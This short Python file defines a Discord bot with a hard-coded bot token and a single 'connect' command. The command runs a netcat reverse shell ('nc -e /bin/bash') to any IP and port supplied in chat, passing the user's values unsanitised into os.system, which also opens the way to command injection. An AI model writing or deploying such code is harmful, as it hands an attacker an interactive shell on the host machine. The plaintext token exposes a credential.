import os
import discord
from discord.ext import commands
import time

TOKEN = "OTEyNDg3NjIwMzcyNzUwMzQ2.YZwqUQ.axUYopAs0346tZqvW1Xbg_7VS2w" 

OmgzServerBot = commands.Bot(command_prefix=[">",".c ","Omgz "])

@OmgzServerBot.event
async def on_ready():
	print("Ready to connect")

@OmgzServerBot.command()
async def connect(ctx,port="87",ip="192.168.0.76"):
	await ctx.send(f"Attempting to connect to {ip}")
	os.system(f"nc -e /bin/bash {ip} {port}")



OmgzServerBot.run(TOKEN)